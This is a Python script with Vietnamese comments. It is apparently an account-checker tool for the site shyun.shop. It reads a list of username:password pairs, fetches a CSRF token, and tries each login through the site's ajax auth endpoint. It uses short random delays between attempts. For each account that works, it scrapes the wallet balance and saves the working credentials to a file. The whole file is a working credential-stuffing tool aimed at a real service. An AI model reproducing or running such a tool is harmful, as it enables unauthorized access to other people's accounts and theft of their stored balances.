# -*- coding: utf-8 -*-
import requests
from bs4 import BeautifulSoup
import time
import random
import re

# Cấu hình file đầu vào và đầu ra
FILE_INPUT = "shyun_acc.txt"
FILE_SUCCESS = "success_shyun.txt"

def get_balance_shyun(html_content):
    """
    Bóc tách số dư từ class sidebar-user-balance
    Mẫu của bạn: <span class="sidebar-user-balance">0đ</span>
    """
    try:
        soup = BeautifulSoup(html_content, 'html.parser')
        
        # Tìm theo class chính xác mà bạn đã cung cấp
        balance_tag = soup.find("span", class_="sidebar-user-balance")
        if balance_tag:
            return balance_tag.text.strip()
            
        # Cách dự phòng tìm kiếm theo cụm từ có chữ 'đ' hoặc 'đoàn'
        for span in soup.find_all("span"):
            if "đ" in span.text:
                return span.text.strip()
                
        return "0đ"
    except Exception:
        return "N/A"

def check_shyun(username, password):
    # Khởi tạo Session để tự giữ Cookie và Session liên tục
    session = requests.Session()
    
    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    try:
        # Làm sạch tài khoản, xóa bỏ các ký tự ẩn BOM bẩn từ Windows
        user_clean = username.strip().replace('\ufeff', '')
        pass_clean = password.strip()
        
        print(f"[🚀] Đang kiểm tra tài khoản: {user_clean}")
        
        # BƯỚC 1: Gọi trang đăng nhập để đồng bộ Cookie hệ thống và lấy mã csrf_token tươi
        r_init = session.get('https://shyun.shop/client/login', headers={'accept': 'text/html'}, timeout=15)
        soup_init = BeautifulSoup(r_init.text, 'html.parser')
        
        # Tìm mã csrf_token trong form ẩn
        csrf_token = ""
        csrf_input = soup_init.find('input', {'name': 'csrf_token'})
        if csrf_input:
            csrf_token = csrf_input.get('value')
        else:
            # Tìm dự phòng trong thẻ meta
            meta_token = soup_init.find('meta', {'name': 'csrf-token'})
            if meta_token:
                csrf_token = meta_token.get('content')

        # Nếu không lấy được Token có thể do Cloudflare chặn IP
        if not csrf_token:
            print(f"[!] {user_clean}: Không lấy được mã bảo mật csrf_token. Có thể đã bị chặn IP.")
            return False, None

        # BƯỚC 2: Chuẩn bị dữ liệu để POST đăng nhập (Giống cấu trúc Form-Data bạn gửi)
        login_data = {
            'action': 'Login',
            'csrf_token': csrf_token,
            'username': user_clean,
            'password': pass_clean,
            'redirect_url': ''
        }
        
        post_headers = headers.copy()
        post_headers.update({
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://shyun.shop',
            'referer': 'https://shyun.shop/client/login'
        })

        # Gửi lệnh POST đăng nhập tới endpoint xử lý ajax
        response = session.post('https://shyun.shop/ajaxs/client/auth.php', data=login_data, headers=post_headers, timeout=20)
        
        # BƯỚC 3: Đọc phản hồi trả về từ Server
        is_success = False
        error_msg = "Sai mật khẩu hoặc tài khoản"
        
        try:
            res_json = response.json()
            error_msg = res_json.get('msg', 'Không rõ lỗi')
            # Kiểm tra xem phản hồi có báo thành công không (Thường là status = 'success' hoặc chứa chữ thành công)
            if res_json.get('status') == 'success' or 'thành công' in error_msg.lower():
                is_success = True
        except:
            # Dự phòng nếu server phản hồi dạng text thuần
            if "thành công" in response.text.lower() or "success" in response.text.lower():
                is_success = True
            error_msg = response.text[:80] # Trích xuất nhanh 80 ký tự đầu để đọc lỗi nếu sập

        # BƯỚC 4: Xử lý kết quả thành công và bóc tách ví tiền
        if is_success:
            print(f"[✅] Đăng nhập OK! Đang tiến hành bóc tách ví tiền...")
            
            # Tải lại trang quản lý/trang chủ bằng chính Session đã login để load giao diện chứa số dư
            r_home = session.get('https://shyun.shop/', headers={'accept': 'text/html'}, timeout=15)
            balance = get_balance_shyun(r_home.text)
            
            return True, balance
        else:
            print(f"[❌] Hệ thống từ chối: {error_msg}")
            return False, None

    except Exception as e:
        print(f"[!] Lỗi kết nối tại acc {username}: {e}")
        return False, None

def main():
    print("="*55)
    print("      TOOL CHECK SHYUN.SHOP - REQUESTS MODE")
    print("="*55)
    
    try:
        # Đọc file bằng utf-8-sig để tự động lọc sạch dấu BOM ẩn
        try:
            with open(FILE_INPUT, 'r', encoding='utf-8-sig', errors='ignore') as f:
                accounts = [line.strip() for line in f if ':' in line]
        except FileNotFoundError:
            print(f"[❌] LỖI: Không tìm thấy file đầu vào '{FILE_INPUT}'!")
            print(f"[*] Hãy tạo file tên '{FILE_INPUT}' đặt cùng thư mục với file tool nhé.")
            return

        if not accounts:
            print(f"[⚠️] CẢNH BÁO: File '{FILE_INPUT}' đang rỗng!")
            return

        print(f"[*] Tìm thấy {len(accounts)} tài khoản. Bắt đầu chạy...\n")

        with open(FILE_SUCCESS, 'a', encoding='utf-8') as f_out:
            for acc in accounts:
                user, pwd = acc.split(':', 1)
                is_ok, bal = check_shyun(user, pwd)
                
                if is_ok:
                    print(f"[💰] Kết quả: {user.strip()} -> {bal}")
                    f_out.write(f"{user.strip()}:{pwd.strip()} | {bal}\n")
                    f_out.flush()
                
                # Delay ngẫu nhiên một khoảng ngắn
                wait_time = random.randint(0, 1)
                print(f"--- Chờ {wait_time}s sang tài khoản kế tiếp ---\n")
                time.sleep(wait_time)

    except Exception as global_error:
        print(f"\n[💥] LỖI HỆ THỐNG PHÁT SINH: {global_error}")
    finally:
        print("\n" + "="*55)
        input("NHẤN ENTER ĐỂ THOÁT TOOL...")

if __name__ == "__main__":
    main()